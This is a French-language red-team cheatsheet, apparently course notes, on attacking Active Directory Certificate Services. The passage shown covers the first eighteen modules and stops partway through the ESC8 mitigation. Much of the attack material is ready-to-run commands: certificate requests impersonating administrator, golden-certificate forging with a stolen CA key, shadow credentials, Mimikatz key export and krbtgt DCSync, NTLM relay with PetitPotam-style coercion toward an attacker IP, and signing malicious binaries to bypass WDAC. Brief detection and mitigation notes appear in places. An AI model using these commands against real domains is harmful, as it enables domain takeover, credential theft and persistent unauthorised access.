---
title: "Active Directory Certificate Services (ADCS) Attacks"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "**Auteur**: Nikhil Mittal (@nikhil_mitt) - Altered Security **Objectif**: Comprendre AD CS et exécuter attacks contre setup Enterprise typique"
summary: "ActiveDirectory | Active Directory Certificate Services (ADCS) Attacks"
tags:
  - "Active Directory"
  - "Kerberos"
  - "Red Team"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "ActiveDirectory"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## 📋 Vue d'ensemble du cours

**Auteur**: Nikhil Mittal (@nikhil_mitt) - Altered Security  
**Objectif**: Comprendre AD CS et exécuter attacks contre setup Enterprise typique  
**Prérequis**: Connaissance base AD security (CRTP/CRTE recommandé)  
**Lab**: https://adcs.enterprisesecurity.io/  
**Méthode**: Assume Breach - Pas d'exploits, abuse de fonctionnalités

**25 Modules couverts**:
1. Introduction AD CS
2. AD CS Attacks & Defense Techniques  
3. Basics of AD CS Attacks
4. AD CS Patches
5. Enumeration
6. Local PrivEsc (CertPotato)
7. THEFT1 & PERSIST1
8. Shadow Credentials
9. THEFT4
10. ESC1
11. ESC2 & PERSIST3
12. THEFT2 & THEFT3
13. ESC4 & PERSIST2
14. ESC3
15. Code Signing
16. Encrypted File System (EFS)
17. ESC5 & DPERSIST3
18. ESC8
19. ESC11
20. SSH Authentication
21. VPN with CBA & Linux Cert Storage
22. ESC7.1
23. Trusting CA Certs & DPERSIST1
24. Azure Privilege Escalation (CBA)
25. Defense - Prevention & Detection

---

## 📚 MODULE 1: INTRODUCTION TO AD CS

### Qu'est-ce que AD CS ?

**Active Directory Certificate Services** = Infrastructure PKI (Public Key Infrastructure) Microsoft intégrée à Active Directory

**Rôle principal**: 
- Emettre et gérer certificats numériques X.509
- Support authentification (Smart Cards, Client Authentication)
- Signature de code, Encryption (EFS, Email), VPN, etc.

### Components AD CS

**1. Certification Authority (CA)**
- **Enterprise CA**: Intégrée AD, utilise templates, auto-enrollment
- **Standalone CA**: Non-intégrée AD, requêtes manuelles

**2. Certificate Templates**
- Modèles définissant:
  - Purpose du certificat (EKU - Extended Key Usage)
  - Qui peut requérir (enrollment permissions)
  - Validité
  - Attributs (SAN - Subject Alternative Name)

**3. Certificate Enrollment**
- Web Enrollment: Interface web
- Auto-Enrollment: Via Group Policy
- Manual Request: certreq.exe, MMC

**4. Certificate Revocation**
- CRL (Certificate Revocation List)
- OCSP (Online Certificate Status Protocol)

### PKI Hierarchy

```
Root CA (hors ligne, sécurisée)
  ↓
Issuing CA (Enterprise CA, émet certificats users/computers)
  ↓
Certificats (users, computers, services)
```

### Certificate Components

**X.509 Certificate contient**:
- **Subject**: Identity (CN, OU, O, C)
- **Issuer**: CA qui a émis
- **Serial Number**: Unique identifier
- **Public Key**: Clé publique
- **Validity Period**: Not Before / Not After
- **Extended Key Usage (EKU)**: Usage autorisé
  - Client Authentication (1.3.6.1.5.5.7.3.2)
  - Server Authentication (1.3.6.1.5.5.7.3.1)
  - Code Signing (1.3.6.1.5.5.7.3.3)
  - Email Protection (1.3.6.1.5.5.7.3.4)
- **Subject Alternative Name (SAN)**: Identités alternatives
  - UPN (User Principal Name): user@domain.com
  - DNS: server.domain.com
  - Email: user@company.com

### Certificate-Based Authentication (CBA)

**Kerberos PKINIT** (RFC 4556):

1. Client possède certificat + private key
2. Client envoie AS-REQ avec certificat au DC
3. DC vérifie:
   - Certificat signé par CA de confiance
   - Validité (dates, CRL/OCSP)
   - EKU contient "Client Authentication"
   - Mapping certificat → AD account
4. DC répond TGT si valide

**Certificate Mapping** (certificat → compte AD):

**Type 1: Explicit Mapping** (altSecurityIdentities attribute)
```ldap
altSecurityIdentities: X509:<I>IssuerDN<S>SubjectDN
altSecurityIdentities: X509:<I>IssuerDN<SR>SerialNumber
```

**Type 2: Implicit Mapping** (SAN UPN)
- DC extrait UPN du SAN
- Cherche user avec userPrincipalName matching
- ⚠️ **Plus vulnérable** car pas besoin altSecurityIdentities

### Certificate Storage

**Windows**:
- **User Store**: `certmgr.msc`
  - Current User\Personal\Certificates
- **Computer Store**: `certlm.msc`
  - Local Machine\Personal\Certificates
- **Registry**: 
  - `HKCU\Software\Microsoft\SystemCertificates`
  - `HKLM\Software\Microsoft\SystemCertificates`
- **Files**: DPAPI-protected (`.pfx`, `.p12`)

**Linux**:
- `.pem`, `.crt` files
- Password-protected PKCS#12 (`.pfx`)

---

## 📚 MODULE 2: AD CS ATTACKS & DEFENSE TECHNIQUES

### Attack Categories

**THEFT**: Vol de certificats existants
- THEFT1: User certificate export
- THEFT2: Machine certificate export  
- THEFT3: Certificate from backup
- THEFT4: Certificate from AD attribute

**PERSIST**: Persistence via certificats
- PERSIST1: Forged certificate (Golden Certificate)
- PERSIST2: Certificate renewal
- PERSIST3: Certificate template modification

**DPERSIST**: Domain persistence
- DPERSIST1: Trusting malicious CA
- DPERSIST3: Malicious certificate template

**ESC (Escalation)**: Privilege escalation
- ESC1: Misconfigured template (SAN abuse)
- ESC2: Any Purpose EKU
- ESC3: Enrollment Agent template
- ESC4: Vulnerable ACL on template
- ESC5: Vulnerable ACL on CA
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
- ESC7: Vulnerable CA permissions
- ESC8: NTLM Relay to HTTP Enrollment
- ESC9: No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
- ESC10: Weak certificate mappings
- ESC11: IF_ENFORCEENCRYPTICERTREQUEST not enabled

### Defense Layers

1. **Prevention**: Hardening templates, ACLs, CA config
2. **Detection**: Logging, monitoring
3. **Response**: Certificate revocation, CA shutdown

---

## 📚 MODULE 3: BASICS OF AD CS ATTACKS

### Certificate Request Process

```
1. User → certreq.exe / API → Certificate Request
2. CA validates:
   - User has enrollment permission
   - Template allows enrollment
   - Request compliant with template
3. CA issues certificate
4. User retrieves certificate
```

### Key Attack Concepts

**1. Subject Alternative Name (SAN) Abuse**
- Si template permet SAN
- Attacker peut spécifier UPN de user privilégié
- Obtient certificat pour autre identity

**2. Extended Key Usage (EKU)**
- **Client Authentication** = peut authentifier AD
- **Any Purpose** = tous usages (dangereux)

**3. Certificate Mapping**
- **Weak Mapping**: SAN UPN seulement (ESC10)
- **Strong Mapping**: Certificate + SID matching

**4. Manager Approval**
- Si enabled = CA admin doit approuver requête
- Security control mais peut être bypassé (ESC4)

### Certificate File Formats

**PEM** (Privacy Enhanced Mail):
```
-----BEGIN CERTIFICATE-----
Base64EncodedCertificate
-----END CERTIFICATE-----
```

**DER**: Binary encoding

**PFX/P12** (PKCS#12): Certificate + Private Key (password-protected)

**Conversion**:
```bash
# PEM to PFX
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem

# PFX to PEM
openssl pkcs12 -in cert.pfx -out cert.pem -nodes
```

---

## 📚 MODULE 4: AD CS PATCHES

### Timeline Patches Importants

**May 2022 (KB5014754)**: 
- Mitigation ESC1, ESC2, ESC3, ESC4, ESC5
- Introduction Strong Certificate Mapping
- StrongCertificateBindingEnforcement registry key

**November 2022**:
- ESC8 mitigation (Extended Protection EPA)

**May 2023**:
- ESC9, ESC10, ESC11 patches

### Registry Keys Critiques

**StrongCertificateBindingEnforcement** (`HKLM\SYSTEM\CurrentControlSet\Services\Kdc`):
- **0**: Disabled (vulnerable à ESC1)
- **1**: Compatibility mode (log warnings)
- **2**: Full enforcement (required)

**CertificateMappingMethods** (`HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel`):
- **0x1**: Subject/Issuer
- **0x2**: Issuer only
- **0x4**: SAN (UPN)
- **0x8**: SAN (DNS)
- **0x10**: S4U2Self
- **0x18**: Combination (recommended = 0x18)

### Vérifier Patch Level

```powershell
# Check KB installed
Get-HotFix | Where-Object {$_.HotFixID -like "*KB5014754*"}

# Check registry
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement"
```

---

## 📚 MODULE 5: ENUMERATION

### Enumération Enterprise CA

```powershell
# Certutil (built-in)
certutil -config - -ping

# Liste toutes CAs de la forest
certutil -TCAInfo

# Certify (C#)
.\Certify.exe cas

# Informations détaillées CA
.\Certify.exe cas /ca:CA-NAME

# Certificer (C# alternative)
.\Certificer.exe cas
```

### Enumération Certificate Templates

```powershell
# Certutil - Liste tous templates
certutil -v -template

# Certify - Templates accessibles
.\Certify.exe find

# Templates vulnérables
.\Certify.exe find /vulnerable

# Templates current user peut enroll
.\Certify.exe find /currentuser

# Filter par EKU
.\Certify.exe find /clientauth

# Certificer
.\Certificer.exe find
```

### Enumération Permissions

```powershell
# ACL sur template
.\Certify.exe find /showAllPermissions

# ACL sur CA
Get-Acl "AD:\CN=CA-NAME,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | fl

# PowerView
Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -ResolveGUIDs
```

### Enumération Certificats Issued

```powershell
# Via CA
certutil -view -out "Issued Common Name, Certificate Template"

# Certificats d'un user
certutil -view -restrict "RequesterName=domain\user" -out "Issued Common Name"

# Certificats dans AD (altSecurityIdentities)
Get-ADUser -Filter * -Properties altSecurityIdentities | Where-Object {$_.altSecurityIdentities}
```

### Enumération Web Enrollment

```powershell
# Chercher Web Enrollment endpoint
.\Certify.exe find /enrollmentendpoints

# URL typique
http://CA-SERVER/certsrv
https://CA-SERVER/certsrv
```

---

## 📚 MODULE 6: LOCAL PRIVILEGE ESCALATION - CERTPOTATO

### Concept CertPotato

**Attack Flow**:
1. Trigger SYSTEM/user privilégié à s'authentifier vers attacker
2. Relay authentication vers Web Enrollment
3. Request certificat pour compte privilégié
4. Use certificat pour authentification

**Similaire**: RottenPotato, JuicyPotato mais abuse AD CS

### Prerequisites

- Web Enrollment activé
- Local admin OU capacité trigger SYSTEM authentication
- Template permettant enrollment sans approval

### Attack

```powershell
# CertPotato.exe
.\CertPotato.exe -webserver http://CA/certsrv -template User

# Récupère certificat .pfx
# Puis authentification
.\Rubeus.exe asktgt /user:SYSTEM /certificate:SYSTEM.pfx /password:password /ptt
```

⚠️ **CertPotato** abuse COM objects pour trigger SYSTEM authentication, similaire autres "Potato" attacks.

---

## 📚 MODULE 7: THEFT1 & PERSIST1

### THEFT1: User Certificate Export

**Concept**: Exporter certificats de current user certificate store

**Enumération certificats user**:
```powershell
# Via certmgr.msc
# OU PowerShell
Get-ChildItem Cert:\CurrentUser\My

# Liste certificats avec private key
Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.HasPrivateKey}

# Certify
.\Certify.exe find /currentuser
```

**Export certificat**:
```powershell
# Via GUI: certmgr.msc → Right-click → All Tasks → Export → Include private key

# PowerShell
$cert = Get-ChildItem Cert:\CurrentUser\My\THUMBPRINT
$password = ConvertTo-SecureString -String "password" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath C:\temp\cert.pfx -Password $password

# SharpDPAPI
.\SharpDPAPI.exe certificates /machine

# Mimikatz
mimikatz# crypto::capi
mimikatz# crypto::cng
mimikatz# crypto::certificates /export
```

### PERSIST1: Golden Certificate (Forged Certificate)

**Concept**: Forger certificat avec CA private key → persistence même après password reset

**Obtenir CA Certificate + Private Key**:

**Méthode 1: Depuis CA server (DA requis)**:
```powershell
# Mimikatz
mimikatz# privilege::debug
mimikatz# crypto::capi
mimikatz# crypto::cng
mimikatz# crypto::keys /export

# SharpDPAPI
.\SharpDPAPI.exe certificates /machine /mkfile:key.pvk

# Certutil
certutil -store my
certutil -exportPFX my SERIALNUMBER ca.pfx
```

**Méthode 2: Backup CA**:
```powershell
# Si backup CA accessible
# Extract .p12 file from backup
```

**Forger Certificate**:
```powershell
# ForgeCert (https://github.com/GhostPack/ForgeCert)
.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword password --Subject "CN=User" --SubjectAltName user@domain.com --NewCertPath forged.pfx --NewCertPassword password

# Paramètres importants:
# --CaCertPath: CA certificate with private key
# --Subject: Certificate subject (peut être arbitraire)
# --SubjectAltName: UPN du user à impersonate
# --NewCertPath: Output forged certificate
```

**Utilisation**:
```powershell
.\Rubeus.exe asktgt /user:user /certificate:forged.pfx /password:password /ptt
```

⚠️ **Golden Certificate vs Golden Ticket**:
- Golden Ticket: KRBTGT hash, expire si KRBTGT reset
- Golden Certificate: CA private key, valide tant que CA compromise non détectée

**Détection**:
- Monitor CA private key access (Event 4876, 4877)
- Validate certificate chain
- Certificate revocation checks

---

## 📚 MODULE 8: SHADOW CREDENTIALS

### Concept

**Key Trust Authentication** (Windows Hello for Business):
- User/Computer object contient `msDS-KeyCredentialLink` attribute
- Contient public key
- Private key sur device (TPM, Windows Hello)
- Authentification via key pair au lieu password

**Shadow Credentials Attack**:
1. Modify `msDS-KeyCredentialLink` attribute d'une target account
2. Ajouter notre propre key pair
3. Authenticate comme target account avec notre private key

### Prerequisites

- **GenericWrite**, **GenericAll**, ou **WriteProperty** sur target account
- Windows Server 2016+ (pour Key Trust support)

### Enumération Permissions

```powershell
# PowerView - Chercher WriteProperty sur msDS-KeyCredentialLink
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | Where-Object {$_.ObjectAceType -like "*KeyCredentialLink*"}

# AD Module
Get-Acl "AD:\CN=targetuser,CN=Users,DC=domain,DC=local" | Select -Expand Access | Where-Object {$_.ObjectType -like "*KeyCredentialLink*"}
```

### Attack avec Whisker

**Whisker** (https://github.com/eladshamir/Whisker):

```powershell
# Add Shadow Credential
.\Whisker.exe add /target:targetuser

# Output:
# - DeviceID
# - Private Key (PEM)
# - Certificate (PFX)

# Authenticate
.\Rubeus.exe asktgt /user:targetuser /certificate:BASE64_CERT /password:"" /domain:domain.local /dc:dc.domain.local /getcredentials /show /nowrap
```

**Cleanup**:
```powershell
# List Shadow Credentials
.\Whisker.exe list /target:targetuser

# Remove Shadow Credential
.\Whisker.exe remove /target:targetuser /deviceid:DEVICE_ID
```

### Attack avec PyWhisker (Linux)

```bash
# Add
python3 pywhisker.py -d domain.local -u attacker -p password --target targetuser --action add

# Export certificate
# Puis Rubeus ou certipy
certipy auth -pfx targetuser.pfx -dc-ip DC_IP
```

### Computer Account Shadow Credentials

**Abuse machine account**:
```powershell
# Si GenericWrite sur computer object
.\Whisker.exe add /target:DC01$

# Authenticate as DC machine account
.\Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt

# Then DCSync
.\Mimikatz.exe "lsadump::dcsync /user:domain\krbtgt"
```

### Defense

- Monitor `msDS-KeyCredentialLink` modifications (Event 5136)
- Restrict GenericWrite/WriteProperty permissions
- Alert sur modifications non-WHfB devices

---

## 📚 MODULE 9: THEFT4

### Concept

**userCertificate Attribute**: Peut contenir certificats publiés dans AD

**Enumération**:
```powershell
# AD Module
Get-ADUser -Filter * -Properties userCertificate | Where-Object {$_.userCertificate}

# PowerView
Get-DomainUser -LDAPFilter "(userCertificate=*)"

# Certify
.\Certify.exe find /showcertificates
```

**Extraction**:
```powershell
# Retrieve certificate from AD
$user = Get-ADUser -Identity targetuser -Properties userCertificate
$cert = $user.userCertificate[0]
[System.IO.File]::WriteAllBytes("C:\temp\user.cer", $cert)

# Convert to PFX (requiert private key - pas stockée dans AD normally)
# Seulement utile si private key leaked par autre moyen
```

⚠️ **Limitation**: userCertificate contient seulement **public certificate**, PAS private key. Utile seulement si private key obtenue séparément.

---

## 📚 MODULE 10: ESC1 - MISCONFIGURED CERTIFICATE TEMPLATE

### Vulnerability

**Conditions ESC1**:
1. Template permet **Client Authentication** EKU
2. Template permet **SAN** (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
3. User a **enrollment permissions**
4. Pas **Manager Approval** requis
5. Pas **Authorized Signatures** requis

### Enumération

```powershell
# Certify
.\Certify.exe find /vulnerable

# Chercher:
# - Client Authentication: True
# - Enrollee Supplies Subject: True
# - Manager Approval: Disabled
# - Authorized Signatures Required: 0

# Certificer
.\Certificer.exe find /vulnerable
```

### Exploitation

```powershell
# Request certificate avec SAN = Administrator
.\Certify.exe request /ca:CA\CA-NAME /template:VulnTemplate /altname:administrator

# Output: certificate.pem (certificate + private key)

# Convert PEM to PFX
openssl pkcs12 -in certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
# Password: (set password)

# Authenticate
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:certpass /ptt

# OU avec Certipy (Linux)
certipy req -u user@domain.local -p password -target ca.domain.local -ca CA-NAME -template VulnTemplate -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### Escalation Cross-Domain

**Si template published à multiple domains**:
```powershell
# Request dans child domain avec SAN = parent domain admin
.\Certify.exe request /ca:CHILD-CA\CA-NAME /template:VulnTemplate /altname:administrator@parent.domain.local /domain:parent.domain.local

# Authenticate vers parent domain
.\Rubeus.exe asktgt /user:administrator /domain:parent.domain.local /certificate:admin.pfx /dc:parent-dc.parent.domain.local /ptt
```

### Mitigation

1. **Remove** CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag
2. **Enable** Manager Approval
3. **Require** Authorized Signatures
4. **Restrict** enrollment permissions

```powershell
# Disable SAN (via CA MMC)
# Template Properties → Subject Name → 
# Change from "Supply in request" to "Build from AD"
```

---

## 📚 MODULE 11: ESC2 & PERSIST3

### ESC2: Any Purpose EKU

**Vulnerability**:
- Template contient **Any Purpose** EKU (2.5.29.37.0)
- OU **No EKU** (SubCA template)
- Permet tous usages incluant Client Authentication

**Enumération**:
```powershell
.\Certify.exe find /vulnerable

# Chercher:
# - Enhanced Key Usage: (Any Purpose)
# OU
# - No EKU defined
```

**Exploitation**:
```powershell
# Request certificate
.\Certify.exe request /ca:CA /template:SubCA /altname:administrator

# Si SubCA template, peut nécessiter approval:
# 1. Request est pending
# 2. CA admin approuve (si ESC7 permissions)
# 3. Retrieve certificate

# Authenticate
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
```

### PERSIST3: Template Modification for Persistence

**Concept**: Modifier template existant pour créer backdoor

**Prerequisites**:
- **WriteDACL**, **WriteProperty**, ou **FullControl** sur template object

**Attack**:
```powershell
# 1. Add enrollment permissions pour notre user
Add-DomainObjectAcl -TargetIdentity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights GenericAll

# 2. Modify template pour enable SAN (si ESC1 path)
# Via ADSI Edit ou template MMC

# 3. Request certificate quand besoin
.\Certify.exe request /ca:CA /template:VulnTemplate /altname:administrator

# Cleanup: Revert template changes
```

**Persistence value**: Template modifications persistent, peut être used multiple fois.

---

## 📚 MODULE 12: THEFT2 & THEFT3

### THEFT2: Machine Certificate Export

**Concept**: Exporter machine certificates (plus privilege que user certs)

**Enumération**:
```powershell
# Machine certificate store (requires elevation)
Get-ChildItem Cert:\LocalMachine\My

# Certificates with private key
Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.HasPrivateKey}

# Certify (as SYSTEM)
.\Certify.exe find /currentuser /storename:my /storelocation:localmachine
```

**Export (requires SYSTEM)**:
```powershell
# SharpDPAPI (as SYSTEM)
.\SharpDPAPI.exe certificates /machine

# Mimikatz (as SYSTEM)
mimikatz# privilege::debug
mimikatz# crypto::capi
mimikatz# crypto::cng /export

# Output: .pfx files
```

**Usage**:
```powershell
# Authenticate as machine account
.\Rubeus.exe asktgt /user:COMPUTERNAME$ /certificate:machine.pfx /ptt

# With machine account TGT, peut faire:
# - S4U2Self pour impersonate users
# - DCSync si Domain Controller
```

### THEFT3: Certificate from Backup

**Locations potentielles**:
- CA Database backup: `C:\Windows\System32\CertLog`
- CA Certificate backup
- User/Machine profile backups
- NTDS.dit backups (si altSecurityIdentities exported)

**Extraction depuis backup**:
```powershell
# Si backup CA database accessible
# Restore dans test CA
# Export certificates via certutil

# OU parse directly
# CA database = ESE database format
# Tools: esentutl.exe
```

---

## 📚 MODULE 13: ESC4 & PERSIST2

### ESC4: Vulnerable ACL on Certificate Template

**Vulnerability**:
- **WriteOwner**, **WriteDACL**, **WriteProperty**, ou **FullControl** sur template
- Permet modifier template pour enable ESC1-3 conditions

**Enumération**:
```powershell
.\Certify.exe find /vulnerable
# OU
.\Certify.exe find /showAllPermissions

# Chercher notre user avec dangerous permissions:
# - WriteOwner
# - WriteDACL  
# - WriteProperty
# - FullControl
```

**Exploitation**:

**Step 1: Take Ownership (si WriteOwner)**:
```powershell
# PowerView
Set-DomainObjectOwner -Identity "CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -OwnerIdentity attacker

# AD Module
Set-ADObject -Identity "CN=TemplateName,..." -Replace @{nTSecurityDescriptor=(Get-Acl "AD:\CN=TemplateName,...").SetOwner([System.Security.Principal.NTAccount]"domain\attacker")}
```

**Step 2: Grant Full Control to self (si WriteDACL)**:
```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity "CN=TemplateName,..." -PrincipalIdentity attacker -Rights FullControl

# AD Module
$acl = Get-Acl "AD:\CN=TemplateName,..."
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.SecurityIdentifier]"S-1-5-21-...-1234","GenericAll","Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=TemplateName,..." -AclObject $acl
```

**Step 3: Modify Template (ESC1 path)**:
```powershell
# Enable SAN
Set-ADObject -Identity "CN=TemplateName,..." -Replace @{msPKI-Certificate-Name-Flag=1}

# Add enrollment permission
# Via AD Users and Computers → Certificate Templates MMC

# Request certificate
.\Certify.exe request /ca:CA /template:TemplateName /altname:administrator
```

### PERSIST2: Certificate Renewal

**Concept**: Renouveler certificat avant expiration pour maintenir access

**Renewal Period**: Défini dans template (ex: 6 weeks avant expiration)

```powershell
# Check renewal period
.\Certify.exe find /template:TemplateName

# Renew certificate
.\Certify.exe renew /ca:CA /template:TemplateName /thumbprint:CERT_THUMBPRINT

# OU via certreq
certreq -enroll -cert THUMBPRINT renew
```

**Persistence value**: Tant que template existe et enrollment permissions persistent, peut renouveler indéfiniment.

---

## 📚 MODULE 14: ESC3 - ENROLLMENT AGENT

### Vulnerability

**Enrollment Agent Template**:
- Template avec **Certificate Request Agent** EKU (1.3.6.1.4.1.311.20.2.1)
- Permet request certificats "on behalf of" d'autres users

**Attack Flow**:
1. Request Enrollment Agent certificate
2. Use pour request certificat au nom de user privilégié
3. Authenticate comme user privilégié

### Enumération

```powershell
.\Certify.exe find /enrollmentagent

# Chercher:
# - Certificate Request Agent EKU
# - Enrollment permissions pour notre user
```

### Exploitation

**Step 1: Request Enrollment Agent Certificate**:
```powershell
.\Certify.exe request /ca:CA /template:EnrollmentAgent

# Convert to PFX
openssl pkcs12 -in agent.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out agent.pfx
```

**Step 2: Request Certificate on Behalf of Administrator**:
```powershell
.\Certify.exe request /ca:CA /template:User /onbehalfof:domain\administrator /enrollcert:agent.pfx /enrollcertpw:password

# OU avec Certipy
certipy req -u user@domain.local -p password -target ca.domain.local -ca CA-NAME -template User -on-behalf-of 'domain\administrator' -pfx agent.pfx
```

**Step 3: Authenticate**:
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
```

### Application Policies (Restriction)

**Application Policy** sur templates peut restreindre quels certificats peuvent être used pour enrollment on behalf:

**Bypasses**:
- Si "Any Purpose" application policy
- Si template target sans application policy restriction
- Si multiple templates disponibles

### Mitigation

- Restrict Enrollment Agent templates
- Enable Application Policy restrictions
- Manager Approval sur templates utilisables avec Enrollment Agent

---

## 📚 MODULE 15: CODE SIGNING CERTIFICATE ABUSE

### Concept

**Code Signing Certificate**: Permet signer code (executables, scripts, drivers)

**Abuse**:
- Signer malicious code avec cert trusted
- Bypass application whitelisting (WDAC, AppLocker)

### Enumération

```powershell
.\Certify.exe find /clientauth:false

# Chercher EKU: Code Signing (1.3.6.1.5.5.7.3.3)
```

### Obtenir Code Signing Certificate

**Méthode 1: ESC1-like**:
```powershell
# Si template permits SAN
.\Certify.exe request /ca:CA /template:CodeSigning /altname:administrator
```

**Méthode 2: Request légitime**:
```powershell
# Si enrollment permissions
.\Certify.exe request /ca:CA /template:CodeSigning
```

### Signing Code

```powershell
# Sign executable
signtool sign /f codesigning.pfx /p password /fd SHA256 malicious.exe

# Sign PowerShell script
Set-AuthenticodeSignature -FilePath script.ps1 -Certificate (Get-PfxCertificate codesigning.pfx)

# Verify signature
signtool verify /pa malicious.exe
Get-AuthenticodeSignature script.ps1
```

### Bypass WDAC

**Si WDAC policy trusts CA**:
1. Obtain code signing cert from trusted CA
2. Sign malicious binary
3. Execute bypasses WDAC

**Mitigation**:
- Restrict code signing template enrollment
- WDAC policies should trust specific publishers, not root CA
- Monitor code signing certificate issuance

---

## 📚 MODULE 16: ENCRYPTED FILE SYSTEM (EFS)

### Concept

**EFS Certificate**: Utilisé pour encrypt/decrypt files avec EFS

**Abuse**:
- Recovery Agent peut decrypt ANY EFS-encrypted file dans domain
- Si compromise Recovery Agent cert = decrypt sensitive data

### EFS Recovery Agent

**Domain-wide EFS Recovery Agent**:
- Défini via Group Policy
- Certificate template: **EFS Recovery Agent**
- Peut decrypt tous fichiers EFS du domain

### Enumération

```powershell
# Check EFS Policy
gpresult /h gpresult.html
# Chercher: EFS Recovery Policy

# Recovery Agent certificates
.\Certify.exe find /clientauth:false
# Chercher EKU: EFS Recovery (1.3.6.1.4.1.311.10.3.4.1)
```

### Exploitation

**Step 1: Obtain EFS Recovery Agent Certificate**:
```powershell
# Si vulnerable template (ESC1-4)
.\Certify.exe request /ca:CA /template:EFSRecovery /altname:administrator

# OU export existing
# From Recovery Agent's machine
```

**Step 2: Decrypt EFS Files**:
```powershell
# Import certificate
certutil -user -p password -importPFX recovery.pfx

# Decrypt file
cipher /d /s:C:\EncryptedFolder

# OU manually
# Right-click encrypted file → Properties → Advanced → Details → Add recovery agent
```

### Mitigation

- Restrict EFS Recovery Agent template
- Monitor EFS Recovery Agent certificate issuance
- Limit who can be EFS Recovery Agent

---

## 📚 MODULE 17: ESC5 & DPERSIST3

### ESC5: Vulnerable ACL on CA Object

**Vulnerability**:
- **WriteOwner**, **WriteDACL**, **WriteProperty**, ou **FullControl** sur CA object dans AD
- Permet modify CA configuration

**Enumération**:
```powershell
# ACL on CA
Get-Acl "AD:\CN=CA-NAME,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | fl

# Certify
.\Certify.exe find /vulnerable

# Chercher permissions dangereuses sur CA object
```

**Exploitation**:

**Scenario 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)**:
```powershell
# Si WriteProperty sur CA
certutil -config "CA\CA-NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

# Restart CA service (requires ManageCA right)
Invoke-Command -ComputerName CA-SERVER -ScriptBlock {Restart-Service certsvc}

# Now exploit comme ESC6
```

**Scenario 2: Grant ManageCA Permission**:
```powershell
# Add ACE for ManageCA
# Via ADSI Edit ou PowerView
Add-DomainObjectAcl -TargetIdentity "CN=CA-NAME,..." -PrincipalIdentity attacker -Rights FullControl

# Then abuse ManageCA (ESC7)
```

### DPERSIST3: Malicious Certificate Template

**Concept**: Créer nouveau template vulnérable pour persistence

**Prerequisites**: Write permission sur Certificate Templates container

```powershell
# Duplicate existing template via CA MMC
# Modify pour ESC1 conditions:
# - Enable SAN
# - Add enrollment permissions
# - Client Authentication EKU

# OU via ADSI
# Copy existing template object
# Modify attributes
```

**Attributes clés**:
- `msPKI-Certificate-Name-Flag`: 1 (ENROLLEE_SUPPLIES_SUBJECT)
- `msPKI-Certificate-Application-Policy`: 1.3.6.1.5.5.7.3.2 (Client Auth)
- `msPKI-Enrollment-Flag`: 0 (no approval)

### Mitigation

- Restrict Write permissions sur CA objects
- Restrict Write permissions sur Certificate Templates container
- Monitor CA configuration changes (Event 4899)
- Monitor new template creation

---

## 📚 MODULE 18: ESC8 - NTLM RELAY TO HTTP ENROLLMENT

### Vulnerability

**HTTP-based Certificate Enrollment Web Interface**:
- URL: `http://CA-SERVER/certsrv/`
- Supporte NTLM authentication
- Vulnerable à NTLM relay si pas Extended Protection for Authentication (EPA)

### Attack Flow

1. Setup NTLM relay vers HTTP enrollment endpoint
2. Coerce authentication depuis target machine (Printerbug, PetitPotam, etc.)
3. Relay authentication pour request certificat
4. Obtain certificat de target account

### Prerequisites

- HTTP enrollment enabled
- EPA disabled (default pre-patch)
- Ability coerce authentication

### Exploitation

**Setup NTLM Relay**:
```bash
# ntlmrelayx avec module AD CS
python3 ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Paramètres:
# -t: Target HTTP enrollment
# --adcs: ADCS mode
# --template: Certificate template à request
```

**Coerce Authentication**:
```bash
# PetitPotam
python3 PetitPotam.py attacker_ip target_dc

# Printerbug
python3 printerbug.py domain/user:password@target_dc attacker_ip

# DFSCoerce
python3 dfscoerce.py -u user -p password -d domain attacker_ip target_dc
```

**Retrieve Certificate**:
```bash
# ntlmrelayx outputs certificate
# Convert et authenticate
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

### Escalation to DA

**Si relay DC machine account**:
```powershell
# Certificate de DC$ account
# Authenticate
.\Rubeus.exe asktgt /user:DC$ /certificate:dc.pfx /ptt

# DCSync
.\Mimikatz.exe "lsadump::dcsync /user:domain\krbtgt"
```

### Mitigation

- **Enable EPA** (Extended Protection for Authentication)
